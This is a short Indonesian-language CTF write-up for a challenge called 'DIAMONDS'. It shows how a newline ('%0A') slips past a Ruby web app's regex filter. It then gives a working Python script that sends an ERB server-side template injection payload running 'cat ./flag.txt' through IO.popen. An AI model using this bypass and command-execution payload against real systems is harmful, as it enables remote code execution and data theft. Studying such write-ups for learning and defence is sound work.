## DIAMONDS

Note: Perlu kita ketahui bahwa website ini dibuat menggunakan ruby

Website memfilter regex ekspression, dimana regex expression in tidak menghitung newline pada parameter yang diinputkan, mengakibatkan kita bisa membypass filter dengan menginputkan url encode "%0A" ke dalam http post requests.

contoh parameter post request untuk membypass regex

```
input=mabar%0A<ini tidak ke filter>
```


Setelah kita bypass kita mencoba salah satu common vulnerability yang biasanya terdapat dalam library WEB untuk bahasa pemrograman OOP yaitu SSTI

untuk payload saya mengambil dari website ini :https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

```python
import requests
import urllib.parse as up

URL = "http://01.linux.challenges.ctf.thefewchosen.com:57588"
class Exploit:
    def __init__(self, param, url=URL):
        self.session = requests.Session()
        # self.session.proxies = {'http': 'http://localhost:8080'}
        self.param = param
        self.url = url
        
    def payloadAndBypass(self, malcode):
        '''bypass regex expression with newline (e.g. \\n)'''
        bypass = "asd\n"
        payload = bypass+malcode
        return {"input":payload}
    
    def start(self):
        r = self.session.post(self.url, data=self.payloadAndBypass(self.param))
        return r.text


param = """<%= IO.popen('cat ./flag.txt').readlines()  %>"""

n = Exploit(param=param).start()
print(n)
```
### referensi
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
